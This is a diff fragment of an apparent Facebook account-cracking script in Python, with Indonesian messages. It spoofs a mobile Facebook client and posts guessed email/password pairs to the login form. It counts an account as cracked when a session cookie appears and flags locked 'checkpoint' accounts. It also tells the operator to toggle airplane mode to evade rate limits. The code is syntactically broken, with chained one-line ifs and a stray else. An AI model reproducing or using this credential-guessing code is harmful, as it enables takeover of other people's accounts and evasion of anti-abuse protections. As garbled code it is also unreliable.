@@ -518,11 +518,11 @@ def log_hasil(user, pasw):
     ses = requests.Session()
     ses.headers.update({
       "Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
-      data.update({"email":self.user,"pass":self.pw})
-      urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
-      response=par(urlPost.text, "html.parser")
-      if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):print("[!] Nyalakan lalu matikan mode pesawat selama 2 Detik.")
-      if "c_user" in session.cookies.get_dict():if "Akun Anda Dikunci" in urlPost.text:if self.satua==True:print(f"\r\33[1;33m[CP] {self.user} | {self.pw}								\33[37;1m\n",end="")
+    data.update({"email":self.user,"pass":self.pw})
+    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
+    response=par(urlPost.text, "html.parser")
+    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):print("[!] Nyalakan lalu matikan mode pesawat selama 2 Detik.")
+    if "c_user" in session.cookies.get_dict():if "Akun Anda Dikunci" in urlPost.text:if self.satua==True:print(f"\r\33[1;33m[CP] {self.user} | {self.pw}								\33[37;1m\n",end="")
       print(f"\r[×] Akun sesi new					\n\n",end="")
       else:
         aman+=1
